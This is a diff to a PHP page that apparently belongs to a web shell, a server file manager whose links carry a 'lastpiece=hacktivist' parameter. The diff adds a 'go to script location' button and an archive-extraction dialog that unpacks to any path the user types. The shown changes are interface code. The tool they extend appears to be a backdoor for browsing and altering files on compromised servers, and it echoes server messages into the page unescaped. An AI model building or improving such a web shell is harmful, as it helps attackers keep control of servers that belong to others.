@@ -2640,8 +2640,11 @@ body {
     <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
     <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>
 
-    <div class="breadcrumb">
-        <strong>DIR:</strong>&nbsp;<?php
+    <div class="breadcrumb" style="display:flex;align-items:center;gap:8px;">
+        <a href="?lph=<?php echo urlencode(dirname(__FILE__)); ?>&lastpiece=hacktivist" title="Go to script location" style="display:inline-flex;align-items:center;justify-content:center;width:24px;height:24px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:4px;color:#00d4ff;text-decoration:none;transition:all 0.2s;" onmouseover="this.style.background='rgba(0,212,255,0.2)'" onmouseout="this.style.background='rgba(0,212,255,0.1)'">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+        </a>
+        <span><strong>DIR:</strong>&nbsp;<?php
         $bPath = str_replace('\\', '/', $currentDirectory);
         $parts = explode('/', $bPath);
         $pathParts = [];
@@ -2654,7 +2657,7 @@ body {
             }
         }
         echo implode('/', $pathParts);
-        ?>
+        ?></span>
     </div>
 
     <!-- Toolbar: Features -->
@@ -2985,6 +2988,53 @@ body {
             <button class="btn btn-primary" onclick="doCreateFile()">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                 Save File
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Unzip Modal -->
+<div class="modal-overlay hidden" id="unzipModal">
+    <div class="modal" style="max-width: 480px;">
+        <div class="modal-header" style="border-bottom-color: rgba(245, 158, 11, 0.3);">
+            <span class="modal-title" style="color: #f59e0b;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                Extract Archive
+            </span>
+            <button class="modal-close" onclick="hideModal2('unzipModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body" style="padding: 16px;">
+            <div style="background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.2); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
+                <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+                    <div style="width:40px;height:40px;background:rgba(245,158,11,0.15);border-radius:8px;display:flex;align-items:center;justify-content:center;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
+                    </div>
+                    <div>
+                        <div style="font-size:13px;font-weight:600;color:var(--text-primary);" id="unzipFileName">archive.zip</div>
+                        <div style="font-size:11px;color:var(--text-muted);" id="unzipFileSize">-</div>
+                    </div>
+                </div>
+            </div>
+            <div class="form-group" style="margin-bottom: 14px;">
+                <label class="form-label">Extract To</label>
+                <input type="text" id="unzipDestination" class="form-input" style="font-family:monospace;font-size:12px;">
+                <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Leave empty to extract in same directory as archive</div>
+            </div>
+            <div id="unzipProgress" style="display:none;">
+                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;text-align:center;">
+                    <div style="width:24px;height:24px;border:3px solid rgba(245,158,11,0.2);border-top-color:#f59e0b;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px;"></div>
+                    <div style="font-size:12px;color:#f59e0b;font-weight:600;">Extracting files...</div>
+                    <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Please wait</div>
+                </div>
+            </div>
+            <div id="unzipResult" style="display:none;"></div>
+            <input type="hidden" id="unzipPath" value="">
+        </div>
+        <div class="modal-footer" id="unzipFooter" style="justify-content: flex-end; gap: 10px;">
+            <button class="btn btn-secondary" onclick="hideModal2('unzipModal')">Cancel</button>
+            <button class="btn" id="unzipBtn" style="background: #f59e0b; border-color: #f59e0b; color: #000; font-weight: 600;" onclick="doExtractZip()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                Extract
             </button>
         </div>
     </div>
@@ -4697,14 +4747,55 @@ function doCompressZip() {
 
 // === EXTRACT ZIP ===
 function extractZip(zipPath) {
-    if (!confirm('Extract ' + zipPath.split('/').pop() + ' to current directory?')) return;
-    showToast('Extracting...', 'info', 2000);
-    fileActionRequest({file_action: 'extract_zip', zip_path: zipPath, extract_to: '<?php echo addslashes($currentDirectory); ?>'}, function(r) {
+    var fileName = zipPath.split('/').pop();
+    var dirPath = zipPath.substring(0, zipPath.lastIndexOf('/')) || '/';
+    document.getElementById('unzipFileName').textContent = fileName;
+    document.getElementById('unzipFileSize').textContent = 'Location: ' + dirPath;
+    document.getElementById('unzipDestination').value = dirPath;
+    document.getElementById('unzipPath').value = zipPath;
+    document.getElementById('unzipProgress').style.display = 'none';
+    document.getElementById('unzipResult').style.display = 'none';
+    document.getElementById('unzipFooter').style.display = 'flex';
+    document.getElementById('unzipModal').classList.remove('hidden');
+}
+
+function doExtractZip() {
+    var zipPath = document.getElementById('unzipPath').value;
+    var extractTo = document.getElementById('unzipDestination').value.trim();
+    var fileName = zipPath.split('/').pop();
+    
+    document.getElementById('unzipProgress').style.display = 'block';
+    document.getElementById('unzipFooter').style.display = 'none';
+    document.getElementById('unzipResult').style.display = 'none';
+    
+    fileActionRequest({file_action: 'extract_zip', zip_path: zipPath, extract_to: extractTo}, function(r) {
+        document.getElementById('unzipProgress').style.display = 'none';
+        var resultDiv = document.getElementById('unzipResult');
+        
         if (r.ok) {
-            showToast(r.msg || 'Extracted successfully', 'success');
-            setTimeout(function() { location.reload(); }, 800);
+            resultDiv.innerHTML = '<div style="background:rgba(63,185,80,0.1);border:1px solid rgba(63,185,80,0.3);border-radius:8px;padding:14px;text-align:center;">' +
+                '<div style="width:40px;height:40px;background:rgba(63,185,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;">' +
+                '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div>' +
+                '<div style="font-size:13px;font-weight:600;color:#3fb950;">Extraction Complete</div>' +
+                '<div style="font-size:11px;color:var(--text-muted);margin-top:4px;">' + esc(r.msg || 'Files extracted successfully') + '</div>' +
+                '</div>';
+            resultDiv.style.display = 'block';
+            document.getElementById('unzipFooter').innerHTML = '<button class="btn" style="background:#3fb950;border-color:#3fb950;color:#000;font-weight:600;" onclick="location.reload()">Refresh Page</button>';
+            document.getElementById('unzipFooter').style.display = 'flex';
+            document.getElementById('unzipFooter').style.justifyContent = 'center';
+            showToast('Extracted ' + fileName, 'success');
         } else {
-            showToast('Extract failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
+            resultDiv.innerHTML = '<div style="background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);border-radius:8px;padding:14px;text-align:center;">' +
+                '<div style="width:40px;height:40px;background:rgba(248,81,73,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;">' +
+                '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>' +
+                '<div style="font-size:13px;font-weight:600;color:#f85149;">Extraction Failed</div>' +
+                '<div style="font-size:11px;color:var(--text-muted);margin-top:4px;">' + esc(r.err || 'Unknown error') + '</div>' +
+                '</div>';
+            resultDiv.style.display = 'block';
+            document.getElementById('unzipFooter').innerHTML = '<button class="btn btn-secondary" onclick="hideModal2(\'unzipModal\')">Close</button>' +
+                '<button class="btn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:600;" onclick="doExtractZip()">Retry</button>';
+            document.getElementById('unzipFooter').style.display = 'flex';
+            playFailSound();
         }
     });
 }
